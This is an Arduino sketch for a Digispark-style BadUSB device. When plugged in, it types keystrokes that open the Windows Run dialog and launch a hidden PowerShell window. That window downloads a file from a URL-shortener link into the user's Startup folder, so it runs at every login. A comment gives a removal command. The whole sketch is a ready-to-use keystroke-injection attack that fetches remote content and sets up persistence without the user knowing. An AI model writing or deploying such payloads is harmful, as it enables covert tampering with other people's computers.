#include "DigiKeyboardFr.h"

void setup() {
  //open powershell
  DigiKeyboardFr.delay(1);
  DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
  DigiKeyboardFr.delay(50);
  //write powershell -windowstyle hidden -command "iwr u.nu/d1uTS -o \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\rl.url\""
  DigiKeyboardFr.println("powershell -windowstyle hidden -command \"iwr u.nu/d1uTS -o \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rl.url\\\"\"");
}

void loop() {
}

// removal command :
// powershell -command "rm \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\rl.url\""
